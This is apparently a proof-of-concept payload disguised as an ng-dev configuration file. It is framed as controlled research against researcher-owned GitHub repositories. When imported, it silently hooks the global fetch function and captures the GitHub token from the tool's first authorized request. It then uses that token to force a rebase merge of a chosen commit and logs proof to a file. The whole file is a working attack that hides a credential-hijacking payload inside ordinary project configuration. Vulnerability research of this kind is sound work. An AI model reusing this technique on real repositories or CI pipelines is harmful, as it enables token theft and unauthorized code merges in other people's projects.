// Controlled payload for the researcher-owned escalation fixture only.
// Captures the caretaker credential in-process from ng-dev's own first GitHub
// API request (no argv or environment read: ng-dev deletes GITHUB_TOKEN before
// importing this file), then performs the attacker-selected SHA-pinned merge.
import fs from 'node:fs';
import crypto from 'node:crypto';

const endpoint =
  'https://api.github.com/repos/staz0t/ngdev-escalation-target-20261114143423/pulls/1/merge';
const body = {merge_method: 'rebase', sha: 'faed08599b836b9e1d17786f2a2e200d0d43d711'};
const realFetch = globalThis.fetch;
let fired = false;

function authorizationOf(input, init) {
  const headers = (init && init.headers) || (input && input.headers);
  if (!headers) return null;
  if (typeof headers.get === 'function') return headers.get('authorization');
  return headers.authorization || headers.Authorization || null;
}

globalThis.fetch = async (input, init = {}) => {
  const auth = fired ? null : authorizationOf(input, init);
  if (auth) {
    fired = true;
    const token = auth.replace(/^(token|bearer)\s+/i, '');
    const tokenHashMatch =
      crypto.createHash('sha256').update(token).digest('hex') === process.env.PWNREQ_EXPECTED_TOKEN_SHA;
    const response = await realFetch(endpoint, {
      method: 'PUT',
      headers: {
        authorization: 'Bearer ' + token,
        accept: 'application/vnd.github+json',
        'content-type': 'application/json',
        'x-github-api-version': '2022-11-28',
      },
      body: JSON.stringify(body),
    });
    const responseBody = await response.text();
    fs.appendFileSync(
      process.env.PWNREQ_CONFIG_PROOF,
      JSON.stringify({
        kind: 'external-config-merge',
        capture: 'in-process-fetch-authorization',
        target: 'staz0t/ngdev-escalation-target-20261114143423',
        pull: 1,
        head: 'faed08599b836b9e1d17786f2a2e200d0d43d711',
        status: response.status,
        tokenHashMatch,
        authority: process.env.CARETAKER_AUTHORITY_CANARY,
        response: responseBody,
      }) + '\n',
    );
  }
  return realFetch(input, init);
};

export const github = {
  owner: 'staz0t',
  name: 'ngdev-escalation-source-20261114143423',
  mainBranchName: 'main',
  mergeMode: 'caretaker-only',
};
